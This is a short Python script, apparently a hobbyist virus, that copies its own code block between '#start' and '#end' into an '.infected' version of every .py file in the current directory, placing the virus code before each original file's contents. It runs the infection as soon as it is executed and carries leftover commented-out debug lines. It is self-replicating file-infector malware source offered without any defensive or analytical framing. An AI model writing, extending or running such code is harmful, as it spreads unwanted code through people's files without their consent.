#start

import os
import time

Files = os.listdir()

def VirusInfection():
    for file in Files:
        if file.endswith('.py'):
            script = open(file, 'r')

            infected_file_name = file + '.infected'
            with open(infected_file_name,'w')as infection:
                with open(__file__, 'r') as CopyVirus:
                    content = CopyVirus.read().splitlines()
                selection = content[content.index('#start'):content.index('#end')+1]
#                with open('test.txt','a') as test:
                for line in selection:
                    infection.write(line + '\n')
#                    test.write('\n'.join(selection))
#               infection.write('')
                with open(file, 'r') as CopyOriginal:
                    infection.write(CopyOriginal.read())







            CopyVirus.close()
            CopyOriginal.close()
#            test.close()
            infection.close()
            script.close()
VirusInfection()

#end


#if this is here you have fucked up